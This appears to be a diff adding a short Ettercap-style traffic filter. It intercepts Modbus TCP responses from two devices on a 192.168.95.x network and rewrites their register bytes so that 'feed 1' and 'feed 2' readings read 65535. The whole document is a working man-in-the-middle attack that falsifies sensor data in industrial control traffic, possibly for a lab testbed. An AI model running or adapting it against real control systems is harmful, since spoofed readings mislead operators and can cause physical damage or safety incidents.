@@ -1,0 +1,17 @@
+# manipulate feed 1 and feed 2 readings to 65535
+
+# feed 1
+if (ip.src == '192.168.95.10' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 11 = 0xff;
+        DATA.data + 12 = 0xff;
+    }
+}
+
+# feed 2
+if (ip.src == '192.168.95.11' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 11 = 0xff;
+        DATA.data + 12 = 0xff;
+    }
+}
